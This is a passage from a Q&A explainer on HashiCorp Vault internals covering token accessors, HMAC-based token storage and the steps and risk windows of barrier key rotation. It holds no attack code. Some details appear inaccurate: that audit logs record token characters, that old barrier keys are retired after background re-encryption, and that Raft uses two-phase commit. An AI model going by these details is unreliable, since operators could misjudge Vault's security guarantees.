For secrets passed to the GCM cipher implementation: Vault uses the `crypto/cipher` standard library which DOES accept `[]byte` — and those bytes may be in regular GC-managed memory. This is a known limitation: the cryptographic operations themselves require the key in regular memory. The mitigation is minimizing the time the key spends in non-mlocked memory and using `runtime.SetFinalizer()` to zero sensitive allocations.

---

### Q3: What is the "Token Accessor" and why does it exist? What security property does it provide?

**Direct answer:**

A Vault token is a secret. If someone needs to revoke or look up metadata about a token, they normally need the token itself — but giving everyone who might need to look up or revoke a token the actual token value defeats the purpose of access control.

The accessor is a random identifier (like a token UUID) that is stored alongside the token in Vault's backend. It allows performing management operations on a token without knowing the token itself.

What you can do with an accessor (but not the token value):
- Look up token metadata (policies, TTL, creation time, entity)
- Revoke the token
- Renew the token
- List all tokens issued by a specific auth method

What you CANNOT do with an accessor:
- Make authenticated API calls to Vault
- Access any secrets
- The accessor itself has no authorization capability

Security properties provided:
1. **Separation of management from usage**: The SOC team might have accessor-level access to investigate/revoke tokens without being able to use those tokens to access secrets
2. **Audit trail**: When a token is used in an audit log, both the accessor AND the first/last characters of the token value are logged. This lets you correlate activity to a token without logging the full token (which would make your audit logs into a secret extraction tool)
3. **Least-privilege revocation**: A service that creates tokens for other services can store the accessor, not the token, and use it for lifecycle management

The token itself: stored only as `HMAC(token_HMAC_key, token_string)` in Vault's storage. The plaintext token is never persisted. When a token arrives in a request header, Vault computes its HMAC and looks up the HMAC in storage. If the HMAC is present: the token is valid. If not: reject. An attacker who reads Vault's storage sees only HMACs, not tokens — they cannot reconstruct valid tokens from HMACs (HMAC is a one-way function with a secret key).

---

### Q4: Describe the exact sequence of operations when Vault rotates its barrier encryption key. What is the risk window during rotation? How does Vault ensure no data is lost?

**Direct answer:**

Vault barrier key rotation (`vault operator rotate`) proceeds as follows:

**Step 1: Generate new barrier key**
Vault generates a new 32-byte AES-256 key from `getrandom()`. Both the OLD key and NEW key now exist simultaneously in RAM (both mlocked).

**Step 2: Write new key to keyring**
Vault stores the new key in the keyring (an in-memory structure that tracks all key versions). The keyring entry: `{key_id: N+1, key: new_key, installed_at: now()}`. The keyring itself is encrypted with the master key on disk.

**Step 3: Update keyring on all Raft nodes**
The new keyring is replicated via Raft to all followers. All nodes now have the new key in their RAM-based keyring. This is a Raft log entry like any other write.

**Step 4: Set new key as active for WRITES**
Vault atomically sets `active_key_id = N+1`. All new writes now use key N+1. All old data is still encrypted with key N.

**Step 5: Background re-encryption (lazy/eager)**
Vault does NOT immediately re-encrypt all existing data. Old data is encrypted with key N, new data with key N+1. The keyring retains old keys so they can still decrypt old entries.

**Step 6: Old key retirement**
When Vault has re-encrypted all entries originally encrypted with key N: it removes key N from the keyring.

**Risk window during rotation:**
- **Both keys in RAM simultaneously**: If an attacker dumps memory at exactly this moment, they get BOTH keys. This is a brief window (seconds), but it exists.
- **Raft replication of new keyring**: Between writing the new keyring locally and replication completing, a follower crash could leave it with the old keyring. After recovery from Raft log, it gets the new keyring. No data loss because Raft ensures durability once committed.
- **Partially re-encrypted data**: Some entries are still encrypted with old key N. If the old key is somehow compromised, those entries are exposed until re-encrypted.

**No data loss guarantee**: Raft two-phase commit means the new keyring is durable before becoming active. If Vault crashes between "new key generated in RAM" and "new keyring written to Raft log": the new key is lost with the process, but the old key is still valid — no data loss, just a failed rotation that needs retrying.

---

*End of document. This breakdown should be revisited when: Vault releases a major version (keyring format changes, new seal types), when underlying hardware changes (new HSM, new CPU generation with different AES-NI behavior), when Raft is replaced with another consensus algorithm, or when Go runtime changes its memory management model. The cryptographic guarantees depend on correct implementation — always re-read the Vault source for auth method validation logic after major updates.*

---

**Critical References:**
- HashiCorp Vault Architecture Documentation
- NIST SP 800-57: Key Management Recommendations  
- RFC 5869: HKDF Key Derivation Function
- Raft Consensus Algorithm (Ongaro, Ousterhout)
- Shamir's Secret Sharing (Shamir, 1979)
- PKCS#11 v2.40: Cryptographic Token Interface Standard
- Intel SGX Developer Reference
- Linux `mlock(2)`, `madvise(2)`, `prctl(2)` man pages